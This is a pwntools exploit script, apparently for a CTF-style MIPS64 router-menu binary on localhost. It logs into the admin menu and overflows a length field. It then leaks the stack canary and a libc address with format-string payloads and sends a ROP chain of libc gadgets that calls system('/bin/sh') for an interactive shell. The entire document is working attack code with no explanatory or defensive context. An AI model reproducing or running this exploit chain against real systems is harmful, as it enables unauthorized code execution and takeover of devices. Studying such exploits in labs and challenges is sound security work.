from pwn import *
context.update(arch='mips64', os='linux', word_size=64, endian='little')

target = remote("localhost", 1337)

# ADDR gadget

# move $t9, $s1 ; jalr $t9 ; nop

jmp_s1 = 0x00000000000bde04

# move $t9, $s0 ; jalr $t9 ; ld $a0, 0x38($sp)

move_t9_s0_ld_a0_0x38 = 0x00000000000606b8

# ld $ra, 0x18($sp) ; ld $s1, 8($sp) ; ld $s0, ($sp) ; jr $ra ; daddiu $sp, $sp, 0x20

ra_ld_s0_s1_jmp_ra = 0x000000000009a900

elf = context.binary = ELF('../vuln')
libc = ELF('../libc.so.6')

# Select admin menu
print(target.recvuntil(b"#>"))
buf = b'5'
target.sendline(buf)

# Enter pwd
print(target.recvuntil(b"#>"))
buf = b'admin'
target.sendline(buf)

# Select Change Wifi Key
print(target.recvuntil(b"#>"))
buf = b'2'
target.sendline(buf)

# Enter pwd and overflow the len fields
print(target.recvuntil(b"#>"))
buf = b'1' * 24
target.sendline(buf)

# Quit adm menu
print(target.recvuntil(b"#>"))
buf = b'1'
target.sendline(buf)

# Connect Wifi
print(target.recvuntil(b"#>"))
buf = b'3'
target.sendline(buf)

print(target.recvuntil(b"#>"))
payload = b'%19$p' # leak canary
target.sendline(payload)

print("\n\nPerform LEAK CANARY\n\n")
for i in range(4):
    target.recvline()
res = target.recvline()
res = res.decode().split("0 - QUIT\n")[0]
canary = int(res, 16)
print(f'Canary: {hex(canary)}\n')

# Connect Wifi
print(target.recvuntil(b"#>"))
buf = b'3'
target.sendline(buf)

print(target.recvuntil(b"#>"))

payload = b'%69$p' # __libc_start_main
target.sendline(payload)


print("\n\nPerform LEAK LIBC\n\n")
for i in range(2):
    target.recvline()
res = target.recvline()
res = res.decode().split("0 - QUIT\n")[0]
__libc_start_main = int(res, 16)


libc_base_addr = __libc_start_main - libc.symbols['__libc_start_main'] - 200
print(f'LIBC base: {hex(libc_base_addr)}\n')

# Calculate addr
system_addr = libc_base_addr + libc.symbols['system']

# exit = libc.sym['exit']
bin_sh_addr = libc_base_addr + next(libc.search(b'/bin/sh'))

log.info(f"system at : 0x{system_addr:x}")
log.info(f"/bin.sh at : 0x{bin_sh_addr:x}")

ra_ld_s0_s1_jmp_ra_addr = libc_base_addr + ra_ld_s0_s1_jmp_ra
jmp_s1_addr = libc_base_addr + jmp_s1
move_t9_s0_ld_a0_0x38_addr = libc_base_addr + move_t9_s0_ld_a0_0x38

print(target.recvuntil(b"#>"))
buf = b'3'
target.sendline(buf)

print(target.recvuntil(b"#>"))


# Perform ROP

buf = b'a' * 24
buf += p64(canary)
buf += b'b' *24
buf += p64(ra_ld_s0_s1_jmp_ra_addr)
buf += p64(jmp_s1_addr) # s0
buf += p64(system_addr) # s1
buf += b'b' * 8
buf += p64(move_t9_s0_ld_a0_0x38_addr) # ra
buf += b'c' * 0x38
buf += p64(bin_sh_addr) # a0
target.sendline(buf)

target.interactive()


